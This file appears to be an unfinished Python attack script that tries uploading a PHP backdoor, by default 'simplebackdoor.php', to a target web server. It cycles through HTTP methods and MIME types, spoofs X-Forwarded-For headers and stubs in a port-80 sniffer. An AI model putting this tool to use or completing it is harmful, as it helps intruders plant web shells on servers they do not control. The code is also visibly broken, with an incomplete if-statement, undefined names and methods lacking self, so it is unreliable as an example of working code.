#!/bin/python
import putupload_options
import requests
import os
import argparse

#OPTIONS!
parser = argparse.ArgumentParser(description='http methods fuxxer')
parser.add_argument('--file',
                                 dest    = 'file',
                                 action  = "store" ,
                                 default = 'simplebackdoor.php' ,
                                 help    = "The file you are wanting to upload" )
parser.add_argument('--cookie',
                                 dest    = 'cookie',
                                 action  = "store" ,
                                 default = 'cookie.txt' ,
                                 help    = "this file is a cookie jar! Only big enough for one cookie! Put a cookie recipie you wish to send along with ... y'kow... whatever" )

parser.add_argument('--target',
                                 dest    = 'target',
                                 action  = "store" ,
                                 default = '127.0.0.1' ,
                                 help    = "TARGET to attack, defaults to localhost" )

parser.add_argument('--xforwardedfor',
                                 dest    = 'xforward',
                                 action  = "store" ,
                                 default = '127.0.0.1' ,
                                 help    = "Sets the X-Forwarded-For header to... something" )
parser.add_argument('--xforwardedip',
                                 dest    = 'xforwardip',
                                 action  = "store" ,
                                 default = '127.0.0.1' ,
                                 help    = "Sets the X-Forward-IP header to... something" )

parser.add_argument('--methhammer',
                                 dest    = 'methhammer',
                                 action  = "store_true" ,
                                 default = False ,
                                 help    = "Brute-Force fuzzer for all methods and options, regexes for a reflection in the response" )

arguments = parser.parse_args()

class  Uploader:
    """required arguments are the url, method, and filename."""
    def __init__(self):
        self.header         = {'Content-type' : mimetype}
        self.uploadfilename = uploadfilename
        self.fileobj        = openfile(self.uploadfilename)
        self.url            = arguments.target
        self.xforward       = arguments.xforward
        self.xforwardip     = arguments.xforwardedip
        self.mimetype       = ''
        self.mimelist       = mimelist = ['text/plain','application/octet-stream','text/css','text/html','text/javascript','image/gif','image/jpeg','image/png','image/svg-xml']
        self.methodlist     = ['get', 'post','put','head','delete', 'patch','options']
        self.methodholder   = ''

        if self.xforward != None:
            self.header.update({'X-Forwarded-For' : self.xforward})
        if self.xforwardip != None:
            self.header.update({'X-Forwarded-IP' : self.xforward})
        if arguments.cookiejar
    def openfile(filename):
        try:
            fileobject = open(arguments.file, 'rb')
            return fileobject
        except OSError as error:
            print("Can't open file for some reason, check permissions or existance")
            print(error)

    def fuzzer(target, content):
        try:
            for each in self.methodlist:
                self.methodholder = each
                for each in self.mimelist:
                    fuzzresult = requests.request(method = self.methodholder, data = content, headers = {'Content-type' : each}, url = target )
                    print('status code : ' + upload.status_code)
            else:
                None
        except KeyboardInterrupt:
                print('KEYBOARD SIGNALS')

    def listener():
        try:
            while True:
                sniff(iface=sniffiface, prn=GET_print, lfilter=lambda p: "GET" in str(p), filter="tcp port 80")
        except:
            print('something happened in the sniffer')
